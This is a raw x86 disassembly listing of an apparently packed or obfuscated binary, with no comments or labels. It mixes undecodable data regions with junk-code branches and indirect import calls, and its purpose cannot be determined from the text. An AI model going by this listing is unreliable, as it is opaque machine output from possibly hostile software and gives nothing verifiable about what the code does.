  41eed8:	ins    DWORD PTR es:[edi],dx
  41eed9:	jl     0x41ee60
  41eedb:	inc    eax
  41eedc:	daa    
  41eedd:	cmp    al,0xdc
  41eedf:	jmp    0x559eda95
  41eee4:	pop    eax
  41eee5:	or     BYTE PTR ds:[edi],al
  41eee8:	add    al,0x71
  41eeea:	adc    DWORD PTR ds:0x4b049e95,0x2a2a237b
  41eef4:	mov    cl,0x24
  41eef6:	sub    eax,0x4761180b
  41eefb:	jo     0x41eea8
  41eefd:	pop    edx
  41eefe:	push   ecx
  41eeff:	push   ss
  41ef00:	popf   
  41ef01:	aas    
  41ef02:	xchg   ebx,eax
  41ef03:	(bad)  
  41ef05:	mov    ebx,0xfbffa5a4
  41ef0a:	repnz rcl BYTE PTR ds:0x4aa91f07,1
  41ef11:	mov    al,cs:0xba5545b4
  41ef17:	jbe    0x41ef70
  41ef19:	adc    al,BYTE PTR [ebx+0x17e1b0c4]
  41ef1f:	out    0xe3,al
  41ef21:	mov    edi,0x349f7fd3
  41ef26:	clc    
  41ef27:	fwait
  41ef28:	(bad)  
  41ef29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef2a:	ja     0x41ef1e
  41ef2c:	rcr    edi,1
  41ef2e:	sti    
  41ef2f:	mov    esp,0xa917a243
  41ef34:	(bad)  
  41ef35:	aad    0x37
  41ef37:	loope  0x41ef6d
  41ef39:	rol    DWORD PTR [esi+0x22],0xdd
  41ef3d:	jo     0x41ef97
  41ef3f:	inc    esp
  41ef40:	push   es
  41ef41:	xchg   ebx,eax
  41ef42:	fstp   TBYTE PTR [ecx-0x14]
  41ef45:	add    ebx,DWORD PTR [esi+eax*1-0x6c582fbe]
  41ef4c:	mov    bh,0x4
  41ef4e:	mov    eax,DWORD PTR [ebp-0x4c]
  41ef51:	adc    DWORD PTR ds:0x42812f,0x3493
  41ef5b:	add    eax,DWORD PTR [ebp-0xb4]
  41ef61:	xor    edx,0x29c
  41ef67:	xor    eax,0x2e02
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x428253
  41ef7a:	sbb    DWORD PTR ds:0x42812f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428147,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x4282bb,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282ab,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x4282bb,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428ddc
  41efd7:	sub    edx,DWORD PTR ds:0x4281ef
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42820b
  41efe4:	mov    DWORD PTR ds:0x428353,0x703b
  41efee:	and    edx,DWORD PTR ds:0x4281fb
  41eff4:	xor    edx,DWORD PTR ds:0x428267
  41effa:	and    DWORD PTR ds:0x428367,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0xa3bba8b0
  41f021:	mov    esp,0x18162999
  41f026:	mov    ds:0x81181812,eax
  41f02b:	fld    DWORD PTR [ecx+eiz*8-0x35]
  41f02f:	xlat   BYTE PTR ds:[ebx]
  41f030:	outs   dx,DWORD PTR ds:[esi]
  41f031:	xchg   esp,eax
  41f032:	mov    edi,0x93153544
  41f037:	sbb    al,0xc3
  41f039:	xchg   ebp,eax
  41f03a:	mov    WORD PTR [edi-0x33],?
  41f03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f03e:	push   ebx
  41f03f:	(bad)  
  41f041:	xchg   BYTE PTR es:[ebp-0x5d35dd75],bh
  41f048:	shr    BYTE PTR [ecx-0x4e],1
  41f04b:	(bad)  
  41f04c:	mov    al,ds:0xc1e4208e
  41f051:	mov    ebp,0x79a83b74
  41f056:	add    DWORD PTR [esi+eiz*8],esi
  41f059:	pusha  
  41f05a:	repz mov dh,0x2
  41f05d:	jne    0x41f04e
  41f05f:	pop    es
  41f060:	push   cs
  41f061:	aaa    
  41f062:	and    eax,0xb85420b8
  41f067:	test   eax,0x3cf479a3
  41f06c:	aad    0xb
  41f06e:	inc    edx
  41f06f:	iret   
  41f070:	sbb    bl,BYTE PTR [eax-0x4c]
  41f073:	call   0x58be0528
  41f078:	scas   eax,DWORD PTR es:[edi]
  41f079:	ins    DWORD PTR es:[edi],dx
  41f07a:	mov    esp,0xb4ec2ea3
  41f07f:	sub    ebp,DWORD PTR [eax]
  41f081:	inc    ebp
  41f082:	shl    BYTE PTR [esi+0x7d2ca834],1
  41f088:	in     eax,0xcd
  41f08a:	in     eax,dx
  41f08b:	das    
  41f08c:	jle    0x41f06d
  41f08e:	push   esi
  41f08f:	sbb    bl,BYTE PTR [esi-0x1adbf473]
  41f095:	cdq    
  41f096:	retf   0x4f3c
  41f099:	add    BYTE PTR [edx+0x26c306f],dl
  41f09f:	jns    0x41f056
  41f0a1:	xlat   BYTE PTR ds:[ebx]
  41f0a2:	and    ecx,DWORD PTR [eax+eax*2+0x2cf63e8b]
  41f0a9:	sub    eax,0x81fa400
  41f0ae:	push   ebx
  41f0af:	add    edi,esi
  41f0b1:	imul   ecx,DWORD PTR [ebx+0x18],0xc63cb738
  41f0b8:	lea    edi,[ebp-0x59e418ee]
  41f0be:	xor    esi,edi
  41f0c0:	xor    al,0xa8
  41f0c2:	dec    ebp
  41f0c3:	popf   
  41f0c4:	aaa    
  41f0c5:	xchg   esp,ebp
  41f0c7:	lock cdq 
  41f0c9:	inc    esp
  41f0ca:	fist   WORD PTR [ecx-0x724d593d]
  41f0d0:	(bad)  
  41f0d1:	push   cs
  41f0d2:	scas   eax,DWORD PTR es:[edi]
  41f0d3:	add    al,0x3
  41f0d5:	pop    ecx
  41f0d6:	(bad)  
  41f0d7:	out    0x95,eax
  41f0d9:	xchg   BYTE PTR [edx],bl
  41f0db:	and    DWORD PTR [edi-0x2e],ecx
  41f0de:	test   al,0x61
  41f0e0:	or     ebp,edx
  41f0e2:	clc    
  41f0e3:	into   
  41f0e4:	dec    ebx
  41f0e5:	or     al,0x6b
  41f0e7:	lods   eax,DWORD PTR ds:[esi]
  41f0e8:	js     0x41f073
  41f0ea:	inc    ebx
  41f0eb:	mov    edi,0x40347b4b
  41f0f0:	daa    
  41f0f1:	ja     0x41f0df
  41f0f3:	sbb    al,0x9
  41f0f5:	and    BYTE PTR [edx+0x8c386e4],al
  41f0fb:	cmp    al,0x2
  41f0fd:	mov    esi,0xfb4a23d9
  41f102:	jb     0x41f16f
  41f104:	dec    edx
  41f105:	xchg   DWORD PTR [ecx-0x378db49e],ebp
  41f10b:	popf   
  41f10c:	pop    es
  41f10d:	adc    bh,BYTE PTR [eax]
  41f10f:	ret    0x91e5
  41f112:	jp     0x41f0e5
  41f114:	push   0xb6fa7ee2
  41f119:	aas    
  41f11a:	pop    esi
  41f11b:	push   ss
  41f11c:	mov    bl,0x7a
  41f11e:	stos   DWORD PTR es:[edi],eax
  41f11f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f120:	das    
  41f121:	cli    
  41f122:	fst    DWORD PTR [ecx+0x5478975e]
  41f128:	or     edi,DWORD PTR [ebx]
  41f12a:	pusha  
  41f12b:	and    al,0xd5
  41f12d:	mov    esp,0xc51dec6a
  41f132:	pop    es
  41f133:	das    
  41f134:	and    edi,DWORD PTR [ecx-0x12]
  41f137:	mov    ds:0x30993b91,al
  41f13c:	js     0x41f126
  41f13e:	or     al,0xce
  41f140:	dec    eax
  41f141:	ja     0x41f19a
  41f143:	(bad)  
  41f144:	xchg   edi,eax
  41f145:	shl    BYTE PTR [ecx-0x12dc637b],0x8c
  41f14c:	pop    ebx
  41f14d:	dec    ebp
  41f14e:	mov    esi,0xfb70f5c5
  41f153:	xchg   ebp,eax
  41f154:	adc    DWORD PTR ds:0x1f7ab7b,ebx
  41f15a:	push   0x2290f38d
  41f15f:	push   edi
  41f160:	out    0xaa,eax
  41f162:	or     BYTE PTR [esi],dh
  41f164:	xor    eax,0x8dd02e01
  41f169:	call   0xacb8:0x6858ebe0
  41f170:	cld    
  41f171:	xchg   DWORD PTR [eax+esi*1],ecx
  41f174:	es mov cl,0xf2
  41f177:	and    dh,ch
  41f179:	mov    ds:0xdf59eb58,al
  41f17e:	sar    BYTE PTR [edi-0x4b1c164],0x16
  41f185:	test   al,0x4
  41f187:	mov    es,WORD PTR [edi+0x51]
  41f18a:	mov    ecx,0xdcf3c9a4
  41f18f:	pop    eax
  41f190:	adc    esi,DWORD PTR [esi-0x2]
  41f193:	nop
  41f194:	dec    ebx
  41f195:	int3   
  41f196:	xchg   esp,eax
  41f197:	adc    eax,0x2b73681f
  41f19c:	fwait
  41f19d:	je     0x41f1f5
  41f19f:	js     0x41f21a
  41f1a1:	scas   eax,DWORD PTR es:[edi]
  41f1a2:	sbb    DWORD PTR [esi+0x5ad47ac1],ebx
  41f1a8:	mov    WORD PTR [ebx],?
  41f1aa:	in     eax,0xf3
  41f1ac:	lods   eax,DWORD PTR ds:[esi]
  41f1ad:	pop    ds
  41f1ae:	xor    ebx,edx
  41f1b0:	inc    esi
  41f1b1:	and    ch,BYTE PTR [esi]
  41f1b3:	xor    al,0xf7
  41f1b5:	icebp  
  41f1b6:	loop   0x41f1be
  41f1b8:	popf   
  41f1b9:	sar    DWORD PTR [edx],cl
  41f1bb:	sub    al,dl
  41f1bd:	dec    ecx
  41f1be:	push   esi
  41f1bf:	lea    esi,[edi+ebp*1+0x4694bce4]
  41f1c6:	sbb    BYTE PTR [edi+ebx*8],cl
  41f1c9:	push   eax
  41f1ca:	adc    ebp,DWORD PTR [edi+0x5de7f12d]
  41f1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1d1:	xchg   esp,ebx
  41f1d3:	adc    BYTE PTR [ecx+0x59],cl
  41f1d6:	push   ds
  41f1d7:	bound  esp,QWORD PTR ds:0xae6df428
  41f1dd:	pop    es
  41f1de:	nop
  41f1df:	punpckhbw mm7,QWORD PTR [ebp+0x10]
  41f1e3:	xchg   ebx,eax
  41f1e4:	test   DWORD PTR ds:0xd5a1dfb5,eax
  41f1ea:	rcr    DWORD PTR [edi+edx*2],0x31
  41f1ee:	aam    0x1d
  41f1f0:	pop    edx
  41f1f1:	xor    dh,cl
  41f1f3:	test   BYTE PTR ss:[edx],cl
  41f1f6:	pop    esp
  41f1f7:	jne    0x41f1a1
  41f1f9:	retf   
  41f1fa:	pushf  
  41f1fb:	lahf   
  41f1fc:	stos   BYTE PTR es:[edi],al
  41f1fd:	pop    esp
  41f1fe:	adc    ebp,DWORD PTR [edx-0x75c7f01f]
  41f204:	in     eax,dx
  41f205:	cmp    cl,BYTE PTR [edx]
  41f207:	pusha  
  41f208:	xor    eax,0x757a079f
  41f20d:	pop    esp
  41f20e:	sbb    BYTE PTR [eax],dl
  41f210:	ja     0x41f210
  41f212:	shr    BYTE PTR [esi+0x5],cl
  41f215:	sub    edi,DWORD PTR [edx]
  41f217:	add    eax,0x1aea0ce7
  41f21c:	lods   al,BYTE PTR ds:[esi]
  41f21d:	inc    edi
  41f21e:	arpl   WORD PTR [bx+si-0x38fb],di
  41f223:	cmp    eax,0x50b5030f
  41f228:	mov    al,0x2d
  41f22a:	ret    
  41f22b:	dec    eax
  41f22c:	or     esp,DWORD PTR [edi+0x16]
  41f22f:	stos   DWORD PTR es:[edi],eax
  41f230:	pop    ss
  41f231:	inc    esp
  41f232:	in     eax,0x13
  41f234:	cmp    edx,esp
  41f236:	add    DWORD PTR [edx-0x65],0x59
  41f23a:	das    
  41f23b:	and    DWORD PTR [bx+si+0x7713],ebx
  41f240:	and    dh,BYTE PTR [edi*4-0xb746ce8]
  41f247:	retf   0x31ba
  41f24a:	ror    BYTE PTR [ebx-0x69],0x16
  41f24e:	dec    edx
  41f24f:	mov    ebx,0x9e2a8d1e
  41f254:	push   ebp
  41f255:	xchg   esi,eax
  41f256:	adc    BYTE PTR [ecx-0x341b9b9d],bl
  41f25c:	mov    DWORD PTR [ebx-0x1013405f],ebx
  41f262:	xchg   edi,eax
  41f263:	push   ecx
  41f264:	in     al,dx
  41f265:	aas    
  41f266:	xor    ecx,DWORD PTR [edi-0x64]
  41f269:	sbb    edi,DWORD PTR [edx+0x2637e82]
  41f26f:	daa    
  41f270:	ret    0xce8e
  41f273:	adc    ebp,DWORD PTR [ebx-0x50314156]
  41f279:	dec    esp
  41f27a:	or     ebx,DWORD PTR [edx+0x7e]
  41f27d:	aad    0xa0
  41f27f:	jmp    0x879d:0x907259cf
  41f286:	pop    ecx
  41f287:	xlat   BYTE PTR ds:[ebx]
  41f288:	and    ebx,DWORD PTR [ebx-0x50]
  41f28b:	jne    0x41f252
  41f28d:	cmp    BYTE PTR [ecx-0x4abbc495],bh
  41f293:	pop    esp
  41f294:	dec    esi
  41f295:	jle    0x41f2ac
  41f297:	cmc    
  41f298:	ins    BYTE PTR es:[edi],dx
  41f299:	or     DWORD PTR [esi-0x6ea4c2e5],eax
  41f29f:	stos   DWORD PTR es:[edi],eax
  41f2a0:	dec    edi
  41f2a1:	jo     0x41f2ba
  41f2a3:	cmp    bh,bh
  41f2a5:	in     al,0x96
  41f2a7:	mov    esi,0xacfaf1e
  41f2ac:	test   BYTE PTR ds:0xb4be8f8b,dl
  41f2b2:	idiv   DWORD PTR [ecx+0x47]
  41f2b5:	mov    ss:0xf124fa5,al
  41f2bb:	mov    dh,BYTE PTR [ebx-0x19]
  41f2be:	dec    edx
  41f2bf:	jl     0x41f257
  41f2c1:	call   0x2b09421f
  41f2c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2c7:	jle    0x41f2e3
  41f2c9:	sub    BYTE PTR [ebp-0x6d1b7d46],0x66
  41f2d0:	xor    dh,BYTE PTR [ecx]
  41f2d2:	mov    dh,cl
  41f2d4:	push   ebx
  41f2d5:	sbb    al,0x69
  41f2d7:	sub    al,ah
  41f2d9:	mov    eax,ds:0x30e6954e
  41f2de:	mov    BYTE PTR [esi],bh
  41f2e0:	cmp    DWORD PTR [ebx+0x4c4f7f3d],0x29
  41f2e7:	out    0x6d,eax
  41f2e9:	mov    bh,0x16
  41f2eb:	mov    ds:0x433a5440,eax
  41f2f0:	cmp    DWORD PTR [edi+0x75],esp
  41f2f3:	dec    edi
  41f2f4:	mov    esi,0xb05058c4
  41f2f9:	inc    edi
  41f2fa:	es pop eax
  41f2fc:	or     dh,al
  41f2fe:	sub    al,0xef
  41f300:	cmp    BYTE PTR [edi],ah
  41f302:	sbb    BYTE PTR gs:[esi+0x44],bh
  41f306:	xchg   ebx,eax
  41f307:	mov    es,WORD PTR [esi+0x46d11311]
  41f30d:	push   esi
  41f30e:	adc    bl,BYTE PTR [edi]
  41f310:	cmp    eax,0xa658255f
  41f315:	cmovge ebp,ecx
  41f318:	jmp    0x41f2c6
  41f31a:	jg     0x41f31d
  41f31c:	mov    dl,0x74
  41f31e:	aaa    
  41f31f:	es push ebp
  41f321:	data16 cmp al,0x4e
  41f324:	jp     0x41f31e
  41f326:	jae    0x41f317
  41f328:	adc    BYTE PTR [eax+0x179d0f39],dh
  41f32e:	sbb    DWORD PTR [edx+eax*1+0x35],esp
  41f332:	cwde   
  41f333:	out    dx,al
  41f334:	sbb    al,0x32
  41f336:	mov    bl,dl
  41f338:	shr    BYTE PTR ds:0xe7ae1896,0xe6
  41f33f:	sbb    al,0x6e
  41f341:	pop    esi
  41f342:	stos   BYTE PTR es:[edi],al
  41f343:	repnz mov ds:0xeb26d53,al
  41f349:	mov    edx,0x634269df
  41f34e:	sar    BYTE PTR [edi],cl
  41f350:	leave  
  41f351:	mul    edx
  41f353:	scas   eax,DWORD PTR es:[edi]
  41f354:	xchg   DWORD PTR [edx+0x397b8875],esp
  41f35a:	sbb    esi,DWORD PTR ds:0xfaf41421
  41f360:	outs   dx,DWORD PTR ds:[esi]
  41f361:	popa   
  41f362:	mov    ds:0xce7bc778,al
  41f367:	sub    esi,DWORD PTR [ecx-0x39]
  41f36a:	inc    ebp
  41f36b:	nop
  41f36c:	mov    DWORD PTR [edi+0x0],ebp
  41f36f:	add    BYTE PTR [ebx+0x4282d33d],al
  41f375:	add    BYTE PTR [eax],al
  41f377:	movzx  edx,WORD PTR ds:0x4281ef
  41f37e:	mov    ecx,DWORD PTR ds:0x428237
  41f384:	mov    ecx,DWORD PTR ds:0x428223
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42820f,ebx
  41f397:	cmp    DWORD PTR ds:0x4282d3,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x4280e3
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428de0
  41f3c7:	sub    ecx,DWORD PTR ds:0x428207
  41f3cd:	mov    DWORD PTR ds:0x428157,0x2f55
  41f3d7:	and    DWORD PTR ds:0x4282b3,ebx
  41f3dd:	or     DWORD PTR ds:0x4282cb,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x42815f
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x4282e7,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42813f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42834b,0x0
  41f428:	mov    DWORD PTR ds:0x4282df,0xae0
  41f432:	mov    DWORD PTR ds:0x42811b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42833b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x4282c3,ebx
  41f449:	mov    DWORD PTR ds:0x42813f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42834b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427ef5
  41f468:	call   DWORD PTR ds:0x428e64
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x428357
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x428157,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282af,0x6486
  41f49d:	mov    DWORD PTR ds:0x42821b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42824b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x428353,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x428157,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x427fbb
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428de4
  41f4d7:	neg    DWORD PTR ds:0x42814b
  41f4dd:	and    DWORD PTR ds:0x42822f,0x4282b3
  41f4e7:	and    DWORD PTR ds:0x42832f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428147
  41f4f4:	sbb    edx,DWORD PTR ds:0x4282cf
  41f4fa:	mov    DWORD PTR ds:0x428147,edx
  41f500:	sub    DWORD PTR ds:0x428243,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42814f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x428353,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428133,0x0
  41f53b:	mov    DWORD PTR ds:0x42834f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42820f,0x6044
  41f55b:	not    DWORD PTR ds:0x42821b
  41f561:	cmp    DWORD PTR ds:0x428133,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428de8
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428113,edi
  41f5a3:	and    DWORD PTR ds:0x4282ab,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x4282c3
  41f5b0:	add    edx,DWORD PTR ds:0x4282bb
  41f5b6:	mov    DWORD PTR ds:0x4282c3,edx
  41f5bc:	add    DWORD PTR ds:0x4282b7,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42821b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42834f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x42815b,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x4282df,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x4282cf,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x428353,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428217,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42822b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428247,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428213
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x42825f,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42822b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428dec
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x4281eb,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x4282b7
  41f67a:	add    DWORD PTR ds:0x4282db,ecx
  41f680:	sbb    DWORD PTR ds:0x42824f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428123
  41f68c:	adc    DWORD PTR ds:0x428117,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x42837f
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42820f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x4282e3,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x4282c7,0x0
  41f6e5:	mov    DWORD PTR ds:0x4282cf,0x6375
  41f6ef:	not    DWORD PTR ds:0x42812f
  41f6f5:	mov    DWORD PTR ds:0x4281eb,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x4281fb,0x2351
  41f70a:	mov    DWORD PTR ds:0x42823f,ebx
  41f710:	cmp    DWORD PTR ds:0x4282c7,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42822b
  41f727:	call   DWORD PTR ds:0x428df0
  41f72d:	movzx  ecx,WORD PTR ds:0x4281fb
  41f734:	xor    DWORD PTR ds:0x428367,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42822b
  41f740:	add    ecx,DWORD PTR ds:0x428223
  41f746:	mov    DWORD PTR ds:0x42822b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42823b
  41f752:	adc    DWORD PTR ds:0x42834b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x4282e7,ebx
  41f75f:	sub    DWORD PTR ds:0x428147,edx
  41f765:	and    DWORD PTR ds:0x4282c7,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x4282db,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428347,0x4282bb
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x4281f7,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428207
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x4281fb,0x428157
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428347,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428247
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x428353,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428337
  41f7d9:	mov    DWORD PTR ds:0x42832b,ecx
  41f7df:	mov    DWORD PTR ds:0x4282cf,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42824f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428147,edi
  41f7fe:	cmp    DWORD PTR ds:0x428353,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f3a
  41f813:	push   0x427ea1
  41f818:	call   DWORD PTR ds:0x428e68
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x42837b
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428237,ecx
  41f830:	adc    DWORD PTR ds:0x42811f,edi
  41f836:	and    DWORD PTR ds:0x42835f,0x3101
  41f840:	mov    DWORD PTR ds:0x428367,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42812f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42821f
  41f857:	mov    DWORD PTR ds:0x42820b,0x4504
  41f861:	mov    DWORD PTR ds:0x42833f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x428363
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x4282cf,ebx
  41f87c:	cmp    DWORD PTR ds:0x42812f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427f6c
  41f890:	push   0x427f76
  41f895:	call   DWORD PTR ds:0x428e6c
  41f89b:	and    DWORD PTR ds:0x428147,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x4282cf,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x428363
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428137,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428227,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42833b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428123,0x42835f
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428237
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x4281ef
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x4282b3,0x0
  41f93e:	mov    DWORD PTR ds:0x4282c3,0x63c0
  41f948:	mov    DWORD PTR ds:0x428153,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x42825f
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x4282b3,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428e70
  41f979:	sbb    DWORD PTR ds:0x428363,0x209
  41f983:	xor    DWORD PTR ds:0x428353,0x72db
